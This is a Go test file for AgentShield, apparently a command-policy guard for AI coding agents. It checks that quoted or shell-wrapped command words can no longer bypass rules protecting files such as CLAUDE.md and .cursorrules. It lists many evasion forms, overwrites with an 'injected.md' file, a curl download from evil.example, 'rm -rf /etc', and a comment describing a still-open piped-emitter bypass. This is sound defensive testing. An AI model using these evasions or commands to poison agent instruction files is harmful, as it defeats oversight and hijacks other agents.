package policy

import (
	"reflect"
	"strings"
	"testing"

	"github.com/AI-AgentLens/agentshield/internal/normalize"
)

// EvaluateQuotedCommandWords (#4873) on a synthetic policy, so the guarantee
// is pinned without the shipped packs: the bare reading of a quoted command
// word can raise the decision, and can never lower it, under both shipped
// defaults and on both evaluation paths.
func TestEvaluateQuotedCommandWords_ReadingOnlyRaises(t *testing.T) {
	rules := []Rule{
		// Unanchored, so the regex-only fallback (whole command, no
		// per-statement retry) can match it too.
		{ID: "custom-block-zzq-x", Match: Match{CommandRegex: `zzq[ \t]+-x`}, Decision: DecisionBlock, Reason: "bare zzq -x"},
		{ID: "custom-block-zzl-quoted", Match: Match{CommandRegex: `"zzl"[ \t]+-y`}, Decision: DecisionBlock, Reason: "quoted zzl -y"},
		{ID: "custom-allow-zzl", Match: Match{CommandRegex: `zzl[ \t]+-y`}, Decision: DecisionAllow, Reason: "bare zzl -y"},
		{ID: "custom-audit-zzw", Match: Match{CommandRegex: `zzw[ \t]+-z`}, Decision: DecisionAudit, Reason: "bare zzw -z"},
	}
	for _, tc := range []struct {
		name     string
		def      Decision
		pipeline bool
	}{
		{"pipeline, default AUDIT", DecisionAudit, true},
		{"pipeline, default REQUIRE_APPROVAL", DecisionRequireApproval, true},
		{"regex-only fallback, default AUDIT", DecisionAudit, false},
		{"regex-only fallback, default REQUIRE_APPROVAL", DecisionRequireApproval, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			pol := DefaultPolicy()
			pol.Defaults.Decision = tc.def
			pol.Rules = append(pol.Rules, rules...)
			var engine *Engine
			var err error
			if tc.pipeline {
				engine, err = NewEngineWithAnalyzers(pol, 2)
			} else {
				engine, err = NewEngine(pol)
			}
			if err != nil {
				t.Fatalf("engine: %v", err)
			}
			eval := func(cmd string, mode QuotedCommandWordsMode) EvalResult {
				return engine.EvaluateQuotedCommandWords(cmd, nil, nil, "", mode)
			}

			// raises: the bare twin's BLOCK is reached after an earlier statement
			// and inside a carrier's payload (#4920)
			for _, cmd := range []string{"echo x; \"zzq\" -x a", "echo x\n'zzq' -x a", `true && "zzq" -x a`,
				`bash -c '"zzq" -x a'`, `bash -s <<< 'echo x; "zzq" -x a'`, `bash < <(echo '"zzq" -x a')`, "bash <<'EOF'\n\"zzq\" -x a\nEOF"} {
				if r := eval(cmd, QuotedCommandWordsOff); r.Decision == DecisionBlock {
					t.Fatalf("control: %q already BLOCKs as written (%v); the row no longer shows the bypass", cmd, r.TriggeredRules)
				}
				if r := eval(cmd, QuotedCommandWordsStricter); r.Decision != DecisionBlock || !has(r.TriggeredRules, "custom-block-zzq-x") {
					t.Errorf("%q decided %v rules=%v; want BLOCK by custom-block-zzq-x", cmd, r.Decision, r.TriggeredRules)
				}
			}

			// never lowers: an as-written BLOCK stands though the bare reading is an ALLOW
			for _, c := range [][2]string{
				{`echo x; "zzl" -y a`, `echo x; zzl -y a`},
				{`bash -c '"zzl" -y a'`, `bash -c 'zzl -y a'`},
			} {
				cmd, bare := c[0], c[1]
				if r := eval(bare, QuotedCommandWordsOff); r.Decision == DecisionBlock {
					t.Fatalf("control: bare form %q decided BLOCK (%v); want the ALLOW rule to be what it reads as", bare, r.TriggeredRules)
				}
				if r := eval(cmd, QuotedCommandWordsStricter); r.Decision != DecisionBlock || !has(r.TriggeredRules, "custom-block-zzl-quoted") || has(r.TriggeredRules, "custom-allow-zzl") {
					t.Errorf("%q decided %v rules=%v; want the as-written BLOCK, untouched", cmd, r.Decision, r.TriggeredRules)
				}
			}

			// a lower or equal bare reading keeps the as-written record: with
			// default REQUIRE_APPROVAL the bare AUDIT rule would LOWER the
			// decision if it replaced it; with default AUDIT it ties.
			for _, cmd := range []string{`echo x; "zzw" -z a`, `bash -c '"zzw" -z a'`} {
				was, got := eval(cmd, QuotedCommandWordsOff), eval(cmd, QuotedCommandWordsStricter)
				if !reflect.DeepEqual(got, was) || got.Decision != tc.def {
					t.Errorf("%q decided %v rules=%v; as written %v rules=%v; want the as-written result (%v), unchanged", cmd, got.Decision, got.TriggeredRules, was.Decision, was.TriggeredRules, tc.def)
				}
			}
		})
	}
}

// TestQuotedCommandWordRows_4873 pins the rows of #4873 on the shipped packs,
// evaluated the way the hook evaluates them (normalized paths and tree, the
// full reading chain).
func TestQuotedCommandWordRows_4873(t *testing.T) {
	engine := newAllPacksEngine(t)
	const rule = "ts-block-agent-memory-copy-overwrite"
	src := "/tmp/" + "injected.md"
	decide := func(cmd string) EvalResult {
		n := normalize.NormalizeCommand(cmd, "")
		return engine.EvaluateWithParsedCwd(cmd, n.Paths, n.Parsed, "")
	}
	off := func(cmd string) EvalResult {
		n := normalize.NormalizeCommand(cmd, "")
		return engine.EvaluateQuotedCommandWords(cmd, n.Paths, n.Parsed, "", QuotedCommandWordsOff)
	}

	t.Run("a quoted verb alone BLOCKs, as on main", func(t *testing.T) {
		for _, cmd := range []string{
			`"cp" ` + src + ` CLAUDE.md`,
			`'cp' ` + src + ` CLAUDE.md`,
			`sh -c 'cp ` + src + ` CLAUDE.md'`,
		} {
			if r := decide(cmd); r.Decision != DecisionBlock || !has(r.TriggeredRules, rule) {
				t.Errorf("%q decided %v rules=%v; want BLOCK by %s", cmd, r.Decision, r.TriggeredRules, rule)
			}
		}
	})

	t.Run("the same verb after an earlier statement decides the same", func(t *testing.T) {
		for _, cmd := range []string{
			// the issue's three rows
			"echo CLAUDE.md\n\"cp\" " + src + " CLAUDE.md",
			`echo CLAUDE.md; "cp" ` + src + ` CLAUDE.md`,
			`echo CLAUDE.md && "cp" ` + src + ` CLAUDE.md`,
			// single-quoted, and a prefix that does not name the file
			"echo CLAUDE.md\n'cp' " + src + " CLAUDE.md",
			`echo CLAUDE.md; 'cp' ` + src + ` CLAUDE.md`,
			`echo CLAUDE.md && 'cp' ` + src + ` CLAUDE.md`,
			`true; "cp" ` + src + ` CLAUDE.md`,
			`cd /repo && "cp" ` + src + ` CLAUDE.md`,
			// mv, another instruction file, a flag, a wrapper, an assignment, a substitution
			`echo x; "mv" /var/tmp/evil.md .cursorrules`,
			`echo x; "cp" ` + src + ` AGENTS.md`,
			`echo x; "cp" -f ` + src + ` CLAUDE.md`,
			`sudo "cp" ` + src + ` CLAUDE.md`,
			`X=1 "cp" ` + src + ` CLAUDE.md`,
			`echo $("cp" ` + src + ` CLAUDE.md)`,
		} {
			if r := off(cmd); r.Decision == DecisionBlock && has(r.TriggeredRules, rule) {
				t.Errorf("control: %q already BLOCKs by %s with the reading off; the row no longer shows the bypass", cmd, rule)
			}
			if r := decide(cmd); r.Decision != DecisionBlock || !has(r.TriggeredRules, rule) {
				t.Errorf("%q decided %v rules=%v; want BLOCK by %s", cmd, r.Decision, r.TriggeredRules, rule)
			}
		}
	})

	t.Run("a backslash-escaped verb already BLOCKs after an earlier statement", func(t *testing.T) {
		// The statement candidates dequote `\cp`; pinned so a change there
		// cannot silently reopen it.
		for _, cmd := range []string{
			`\cp ` + src + ` CLAUDE.md`,
			`echo CLAUDE.md; \cp ` + src + ` CLAUDE.md`,
			"echo CLAUDE.md\n\\cp " + src + " CLAUDE.md",
		} {
			for name, r := range map[string]EvalResult{"off": off(cmd), "production": decide(cmd)} {
				if r.Decision != DecisionBlock || !has(r.TriggeredRules, rule) {
					t.Errorf("%s: %q decided %v rules=%v; want BLOCK by %s", name, cmd, r.Decision, r.TriggeredRules, rule)
				}
			}
		}
	})

	t.Run("a quoted verb inside a carrier's payload decides as its bare twin", func(t *testing.T) {
		// The residual #4873 pinned here, closed by #4920: the reading now
		// folds the payload's command words in place (shellparse.
		// FoldQuotedCommandWordsInPayloads). The three carriers below are the
		// issue's; TestQuotedCommandWordCarrierRows_4920 has the full matrix.
		for _, c := range [][2]string{
			{`bash -c '"cp" ` + src + ` CLAUDE.md'`, `bash -c 'cp ` + src + ` CLAUDE.md'`},
			{`bash -s <<< 'echo CLAUDE.md; "cp" ` + src + ` CLAUDE.md'`, `bash -s <<< 'echo CLAUDE.md; cp ` + src + ` CLAUDE.md'`},
			{`bash < <(echo 'echo CLAUDE.md; "cp" ` + src + ` CLAUDE.md')`, `bash < <(echo 'echo CLAUDE.md; cp ` + src + ` CLAUDE.md')`},
		} {
			quoted, bare := c[0], c[1]
			if r := decide(bare); r.Decision != DecisionBlock || !has(r.TriggeredRules, rule) {
				t.Fatalf("control: bare %q decided %v rules=%v; want BLOCK by %s", bare, r.Decision, r.TriggeredRules, rule)
			}
			if r := off(quoted); r.Decision == DecisionBlock {
				t.Errorf("control: %q already BLOCKs with the reading off (rules=%v); the row no longer shows the bypass", quoted, r.TriggeredRules)
			}
			if r := decide(quoted); r.Decision != DecisionBlock || !has(r.TriggeredRules, rule) {
				t.Errorf("%q decided %v rules=%v; want BLOCK by %s, as its bare twin", quoted, r.Decision, r.TriggeredRules, rule)
			}
		}
	})

	t.Run("a quoted verb in a payload an emitter pipes into a shell is a pinned residual", func(t *testing.T) {
		// Known gap, pinned on purpose: the piped emitter is not read, so
		// these decide exactly as on main while the bare verb in the same
		// pipe BLOCKs. FoldQuotedCommandWordsInPayloads edits bytes, so it can
		// read a payload only where its value is its text; an emitter that
		// decodes escapes (`printf '\n"cp" …\n' | sh`) breaks that. Reading
		// only the plain spelling admitted it into TestEmittedEscapeParity's
		// denominator while its escaped spellings stayed unread, and that
		// sweep went over budget (#4929). What closes it: compose the fold
		// with the escape-decoding reading (shellparse decodeEscapes), so
		// both spellings are read; these rows then fail and move to the
		// carrier BLOCK rows above.
		for _, c := range [][2]string{
			{`echo 'echo CLAUDE.md; "cp" ` + src + ` CLAUDE.md' | bash`, `echo 'echo CLAUDE.md; cp ` + src + ` CLAUDE.md' | bash`},
			{`printf '"cp" ` + src + ` CLAUDE.md' | sh`, `printf 'cp ` + src + ` CLAUDE.md' | sh`},
			{"cat <<'EOF' | bash\n\"cp\" " + src + " CLAUDE.md\nEOF", "cat <<'EOF' | bash\ncp " + src + " CLAUDE.md\nEOF"},
		} {
			quoted, bare := c[0], c[1]
			if r := decide(bare); r.Decision != DecisionBlock || !has(r.TriggeredRules, rule) {
				t.Fatalf("control: bare %q decided %v rules=%v; want BLOCK by %s", bare, r.Decision, r.TriggeredRules, rule)
			}
			got, was := decide(quoted), off(quoted)
			if got.Decision != was.Decision || !reflect.DeepEqual(got.TriggeredRules, was.TriggeredRules) {
				t.Errorf("%q: %v rules=%v; as written %v rules=%v; want unchanged", quoted, got.Decision, got.TriggeredRules, was.Decision, was.TriggeredRules)
			}
			if got.Decision == DecisionBlock {
				t.Errorf("%q now BLOCKs (rules=%v): the pinned residual closed; move it to the carrier BLOCK rows", quoted, got.TriggeredRules)
			}
		}
	})

	t.Run("benign neighbours decide exactly as on main", func(t *testing.T) {
		for _, cmd := range []string{
			`echo CLAUDE.md`,
			`echo CLAUDE.md; "cp" a b`,
			"echo CLAUDE.md\n\"cp\" a b",
			`echo CLAUDE.md; cp a b`,
			`echo "see CLAUDE.md"; "cp" /tmp/build.log ./logs/`,
			`echo CLAUDE.md; "cp" CLAUDE.md /tmp/backup.md`,
			`echo x; "cp" /tmp/CLAUDE.md.bak ./backup/x.bak`,
			`echo CLAUDE.md && "ls" -la`,
			`"ls" -la`,
		} {
			got, was := decide(cmd), off(cmd)
			if got.Decision != was.Decision || !reflect.DeepEqual(got.TriggeredRules, was.TriggeredRules) {
				t.Errorf("%q: %v rules=%v; as written %v rules=%v; want unchanged", cmd, got.Decision, got.TriggeredRules, was.Decision, was.TriggeredRules)
			}
			if got.Decision == DecisionBlock {
				t.Errorf("%q decided BLOCK rules=%v; want no BLOCK on a benign command", cmd, got.TriggeredRules)
			}
		}
	})
}

// quotedCarrierForms are the carriers TestQuotedCommandWordCarrierRows_4920
// wraps a payload in, %s marking it. The first three are #4920's own rows;
// the rest are every other delivery the parser decomposes as shell source
// (CarriesShellSource). An emitter piped into a shell (`echo '%s' | bash`) is
// not one of them: it is a pinned residual in TestQuotedCommandWordRows_4873.
// Single-quoted payloads only: a payload holding a single quote is in
// quotedCarrierFormsDQ.
var quotedCarrierForms = []string{
	"bash -c '%s'",
	"bash -s <<< '%s'",
	"bash < <(echo '%s')",
	"sh -c '%s'",
	"sudo bash -c '%s'",
	"bash <(echo '%s')",
	"source <(echo '%s')",
	"bash <<EOF\n%s\nEOF",
	"bash <<'EOF'\n%s\nEOF",
	"man -P '%s' ls",
	"watch -n 1 '%s'",
	"env -S '%s'",
	"eval '%s'",
	"su -c '%s'",
	"trap '%s' EXIT",
	"echo ok; bash -c '%s'",
}

// quotedCarrierFormsDQ carry a payload whose quoted verb is single-quoted.
var quotedCarrierFormsDQ = []string{
	`bash -c "%s"`,
	`bash -s <<< "%s"`,
	`bash < <(echo "%s")`,
}

// TestQuotedCommandWordCarrierRows_4920 pins #4920 item 1 on the shipped
// packs, through the hook's entry point: a quoted command word inside a
// payload handed to a shell decides exactly as its bare twin (same decision,
// same rules), and nothing that is not such a word moves.
func TestQuotedCommandWordCarrierRows_4920(t *testing.T) {
	engine := newAllPacksEngine(t)
	src := "/tmp/" + "injected.md"
	decide := func(cmd string) EvalResult {
		n := normalize.NormalizeCommand(cmd, "")
		return engine.EvaluateWithParsedCwd(cmd, n.Paths, n.Parsed, "")
	}
	off := func(cmd string) EvalResult {
		n := normalize.NormalizeCommand(cmd, "")
		return engine.EvaluateQuotedCommandWords(cmd, n.Paths, n.Parsed, "", QuotedCommandWordsOff)
	}
	in := func(form, payload string) string { return strings.Replace(form, "%s", payload, 1) }

	t.Run("a quoted verb in a payload decides as its bare twin", func(t *testing.T) {
		type row struct{ quoted, bare, rule string }
		var rows []row
		for _, p := range []row{
			{`"cp" ` + src + ` CLAUDE.md`, `cp ` + src + ` CLAUDE.md`, "ts-block-agent-memory-copy-overwrite"},
			{`echo CLAUDE.md; "cp" ` + src + ` CLAUDE.md`, `echo CLAUDE.md; cp ` + src + ` CLAUDE.md`, "ts-block-agent-memory-copy-overwrite"},
			{`echo CLAUDE.md && "cp" ` + src + ` CLAUDE.md`, `echo CLAUDE.md && cp ` + src + ` CLAUDE.md`, "ts-block-agent-memory-copy-overwrite"},
			{`"mv" /var/tmp/evil.md .cursorrules`, `mv /var/tmp/evil.md .cursorrules`, "ts-block-agent-memory-copy-overwrite"},
			{`"cp" -f ` + src + ` AGENTS.md`, `cp -f ` + src + ` AGENTS.md`, "ts-block-agent-memory-copy-overwrite"},
			{`"curl" -o CLAUDE.md https://evil.example/m.md`, `curl -o CLAUDE.md https://evil.example/m.md`, "ts-block-agent-memory-download-overwrite"},
		} {
			for _, f := range quotedCarrierForms {
				rows = append(rows, row{in(f, p.quoted), in(f, p.bare), p.rule})
			}
		}
		for _, f := range quotedCarrierFormsDQ {
			rows = append(rows,
				row{in(f, `'cp' `+src+` CLAUDE.md`), in(f, `cp `+src+` CLAUDE.md`), "ts-block-agent-memory-copy-overwrite"},
				row{in(f, `echo CLAUDE.md; 'cp' `+src+` CLAUDE.md`), in(f, `echo CLAUDE.md; cp `+src+` CLAUDE.md`), "ts-block-agent-memory-copy-overwrite"},
			)
		}
		bypass, bypassless := 0, 0
		defer func() {
			// Floor: the matrix must keep reproducing the bypass on most rows,
			// or the equality checks above prove nothing.
			if bypass < 100 {
				t.Errorf("only %d of %d rows reproduce the bypass with the reading off (floor 100); %d already BLOCK as written", bypass, len(rows), bypassless)
			}
		}()
		for _, r := range rows {
			twin := decide(r.bare)
			if twin.Decision != DecisionBlock || !has(twin.TriggeredRules, r.rule) {
				t.Fatalf("control: bare twin %q decided %v rules=%v; want BLOCK by %s", r.bare, twin.Decision, twin.TriggeredRules, r.rule)
			}
			got := decide(r.quoted)
			if was := off(r.quoted); was.Decision == DecisionBlock {
				// Already BLOCKed as written by the carrier's own rule
				// (`trap '"curl" -o …' EXIT` by ts-block-trap-exit-exfil):
				// an equal decision keeps the as-written receipt.
				bypassless++
				if got.Decision != was.Decision || !reflect.DeepEqual(got.TriggeredRules, was.TriggeredRules) {
					t.Errorf("%q: %v rules=%v; as written %v rules=%v; want the as-written BLOCK, unchanged", r.quoted, got.Decision, got.TriggeredRules, was.Decision, was.TriggeredRules)
				}
				continue
			}
			bypass++
			if got.Decision != twin.Decision || !reflect.DeepEqual(got.TriggeredRules, twin.TriggeredRules) {
				t.Errorf("%q decided %v rules=%v; want its bare twin's %v rules=%v", r.quoted, got.Decision, got.TriggeredRules, twin.Decision, twin.TriggeredRules)
			}
		}
	})

	// Every row below must decide exactly as with the reading off: decision
	// and receipt, byte for byte.
	unchanged := func(t *testing.T, cmds []string) {
		t.Helper()
		for _, cmd := range cmds {
			got, was := decide(cmd), off(cmd)
			if got.Decision != was.Decision || !reflect.DeepEqual(got.TriggeredRules, was.TriggeredRules) {
				t.Errorf("%q: %v rules=%v; as written %v rules=%v; want unchanged", cmd, got.Decision, got.TriggeredRules, was.Decision, was.TriggeredRules)
			}
		}
	}

	t.Run("a harmless quoted verb in a payload decides as on main", func(t *testing.T) {
		var cmds []string
		for _, p := range []string{`"ls" -la`, `"cp" a b`, `"cp" CLAUDE.md /tmp/backup.md`, `echo x; "cp" ./build.log ./logs/`} {
			for _, f := range quotedCarrierForms {
				cmds = append(cmds, in(f, p))
			}
		}
		unchanged(t, cmds)
		for _, cmd := range cmds {
			if r := decide(cmd); r.Decision == DecisionBlock {
				t.Errorf("%q decided BLOCK rules=%v; want no BLOCK on a harmless payload", cmd, r.TriggeredRules)
			}
		}
	})

	t.Run("a quoted word that is data in a payload is not read as a command", func(t *testing.T) {
		// Its "bare twin" would BLOCK (the regex reads `echo cp … CLAUDE.md`
		// inside a payload); the quoted word is an argument, so it is left
		// as written.
		var cmds []string
		for _, p := range []string{
			`echo "cp" ` + src + ` CLAUDE.md`,
			`grep "cp" CLAUDE.md`,
			`printf "%s\n" "cp" ` + src + ` CLAUDE.md`,
		} {
			for _, f := range quotedCarrierForms {
				cmds = append(cmds, in(f, p))
			}
		}
		unchanged(t, cmds)
	})

	t.Run("a payload that is not shell source is not read", func(t *testing.T) {
		p := `"cp" ` + src + ` CLAUDE.md`
		unchanged(t, []string{
			`python3 -c '` + p + `'`,
			`node -e '` + p + `'`,
			`echo '` + p + `'`,
			`echo '` + p + `' > notes.txt`,
			`echo '` + p + `' | python3`,
			`echo '` + p + `' | grep cp`,
			`git commit -m '` + p + `'`,
			`gh issue comment 1 --body '` + p + `'`,
			`bash script.sh '` + p + `'`,
			"python3 <<'EOF'\n" + p + "\nEOF",
			"cat <<'EOF'\n" + p + "\nEOF",
		})
	})

	t.Run("an equal decision keeps the as-written receipt", func(t *testing.T) {
		// No tie rule (#4873): a payload whose bare reading decides the same
		// keeps main's record. Items 2 and 3 of #4920 are these receipts and
		// are deliberately not changed here.
		unchanged(t, []string{
			// BLOCKed as written by ts-block-herestring-shell-exec
			`bash <<< '"cp" ` + src + ` CLAUDE.md'`,
			// AUDIT both ways; the bare twin names ts-audit-agent-memory-write
			`bash -c '"install" -m 644 rules.txt .cursorrules'`,
			`bash -s <<< 'echo x; "rsync" -a rules.md .clinerules'`,
			// BLOCK both ways; the bare twin also names ts-block-rm-force-recursive
			`bash -c '"rm" -rf /etc'`,
			`bash < <(echo '"rm" -rf /etc')`,
		})
	})
}
